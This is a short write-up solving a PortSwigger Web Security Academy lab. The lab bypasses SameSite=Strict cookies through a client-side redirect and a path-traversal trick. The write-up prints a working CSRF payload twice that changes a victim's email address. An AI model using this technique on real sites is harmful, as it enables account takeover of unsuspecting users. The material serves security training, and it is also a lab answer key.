# Lab: SameSite Strict bypass via client-side redirect (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

**Task (from PortSwigger):**  
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.

Credentials: `wiener:peter`

## Vulnerability
Session cookie is `SameSite=Strict`. Client-side redirect gadget on comment confirmation builds a same-site secondary request that includes the cookie.

## Solution

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

Path traversal in `postId` rewrites the client redirect target to the change-email GET equivalent.

## Final Exploit Payload
```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
